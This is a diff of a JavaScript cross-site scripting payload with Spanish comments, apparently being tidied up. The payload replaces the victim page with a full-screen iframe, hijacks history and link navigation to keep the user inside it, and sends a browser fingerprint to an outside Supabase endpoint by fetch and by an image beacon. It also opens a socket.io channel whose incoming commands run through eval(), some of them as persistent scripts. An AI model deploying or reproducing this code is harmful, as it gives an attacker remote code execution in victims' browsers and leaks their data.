@@ -1,6 +1,3 @@
-// =============================================
-// ESTRATEGIA: IFRAME INMEDIATO + SEPARACIÓN DE CONTEXTOS
-// =============================================
 
 // Verificar contexto inmediatamente
 if (window.self !== window.top) {
@@ -13,9 +10,6 @@ if (window.self !== window.top) {
     setupWebSocketController();
 }
 
-// =============================================
-// PÁGINA PRINCIPAL: IFRAME INMEDIATO + TU FINGERPRINTING
-// =============================================
 function executeMainXSS() {
     'use strict';
     
@@ -43,8 +37,6 @@ function executeMainXSS() {
                 padding: 0 !important;
                 background: white !important;
             `;
-            // ✅ CAMBIO CLAVE: AGREGAR allow-downloads
-            //iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals allow-downloads');
             
             // Limpiar TODO y poner solo el iframe
             document.body.innerHTML = '';
@@ -104,7 +96,7 @@ function executeMainXSS() {
         });
     }
     
-    // 3. FINGERPRINTING COMPLETO (TU CÓDIGO ORIGINAL)
+    // 3. FINGERPRINTING COMPLETO
     function executeFullFingerprinting() {
         try {
             var d = {
@@ -162,7 +154,7 @@ function executeMainXSS() {
                 attackPhase: 'main_with_iframe'
             };
             
-            // Enviar datos via fetch (TU ENDPOINT)
+            // Enviar datos via fetch
             fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
                 method: 'POST',
                 headers: {
@@ -172,13 +164,13 @@ function executeMainXSS() {
                 body: JSON.stringify({fingerprint: d})
             });
             
-            // Backup via imagen (TU BACKUP)
+            // Backup via imagen
             var i = new Image();
             i.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                     btoa(JSON.stringify(d)).substring(0,1500);
 
         } catch(e) {
-
+            // Silenciar errores
         }
     }
     
@@ -197,7 +189,6 @@ function setupIframeRouteSimulation() {
         return;
     }
     window.__IFRAME_ROUTES_ACTIVE__ = true;
-    
     
     // A. INTERCEPTAR HISTORY API
     const originalPushState = history.pushState;
@@ -235,14 +226,13 @@ function setupIframeRouteSimulation() {
         }
         
         if (target && target.href) {
-            // ✅ PERMITIR DESCARGAS - NO hacer preventDefault() para archivos
+            // PERMITIR DESCARGAS - NO hacer preventDefault() para archivos
             if (target.href.includes('/files/down/') || 
                 target.href.includes('.xlsx') || 
                 target.href.includes('.pdf') ||
                 target.href.includes('.csv') ||
                 target.href.includes('.zip') ||
                 target.download) {
- 
                 // Dejar que la descarga proceda normalmente
                 return;
             }
@@ -315,7 +305,6 @@ function setupIframeRouteSimulation() {
             }, '*');
         }
     }, 300);
-
 }
 
 function setupWebSocketController() {
@@ -337,11 +326,9 @@ function setupWebSocketController() {
         const script = document.createElement('script');
         script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
         script.onload = function() {
-             ;
             callback();
         };
         script.onerror = function() {
-             ;
             setTimeout(() => loadSocketIO(callback), 3000);
         };
         document.head.appendChild(script);
@@ -352,15 +339,15 @@ function setupWebSocketController() {
         loadSocketIO(function() {
             try {
                 socket = io(WS_SERVER, {
-                    transports: ['polling'],   // 👈 Solo long-polling
-                    upgrade: false,           // 👈 No intentes WebSocket
+                    transports: ['polling'],
+                    upgrade: false,
                     timeout: 10000,
-                    path: '/socket.io',       // 👈 Asegura que coincida con el server
-                    withCredentials: false    // 👈 porque tienes cookie: false
+                    path: '/socket.io',
+                    withCredentials: false
                 });
                 
                 socket.on('connect', function() {
-
+                    console.log('ws cn');
                 });
                 
                 // Manejar evento execute-command
@@ -379,7 +366,7 @@ function setupWebSocketController() {
                 });
                 
                 socket.on('disconnect', function(reason) {
-
+                    console.log('ws cn');
                 });
                 
                 socket.on('connect_error', function(error) {
@@ -387,7 +374,6 @@ function setupWebSocketController() {
                 });
                 
             } catch (error) {
-
                 setTimeout(connectWebSocket, 5000);
             }
         });
@@ -396,11 +382,10 @@ function setupWebSocketController() {
     function handleExecuteCommand(data) {
         const { command, persistent, id } = data;
         try {
-              + '...');
+            console.log('ej cmnd');
             
-            // ✅ EJECUCIÓN LIBRE CON eval()
+            // EJECUCIÓN LIBRE CON eval()
             const result = eval(command);
-            
             
             if (persistent && id) {
                 persistentScripts[id] = { 
@@ -420,7 +405,8 @@ function setupWebSocketController() {
             }
             
         } catch (error) {
-
+            console.error('err', error);
+            
             // Enviar error
             if (socket && socket.connected) {
                 socket.emit('command_error', {
@@ -441,10 +427,8 @@ function setupWebSocketController() {
                 try {
                     persistentScripts[id].cleanup();
                 } catch (error) {
-
+                    console.error('err:', error);
                 }
-            } else {
-
             }
             
             // Remover del diccionario
@@ -459,7 +443,6 @@ function setupWebSocketController() {
                 });
             }
         } else {
-            
             // Enviar error
             if (socket && socket.connected) {
                 socket.emit('persistent_not_found', {
@@ -471,7 +454,6 @@ function setupWebSocketController() {
     }
 
     function handleSyncPersistent(data) {
-        
         try {
             for (const [id, cmd] of Object.entries(data)) {
                 try {
@@ -484,8 +466,8 @@ function setupWebSocketController() {
                         cleanup: typeof result === 'function' ? result : null 
                     };
                     
-                    
                 } catch (error) {
+                    console.error('err:', error);
                 }
             }
             
@@ -498,6 +480,7 @@ function setupWebSocketController() {
             }
             
         } catch (error) {
+            console.error('err:', error);
             
             if (socket && socket.connected) {
                 socket.emit('sync_error', {
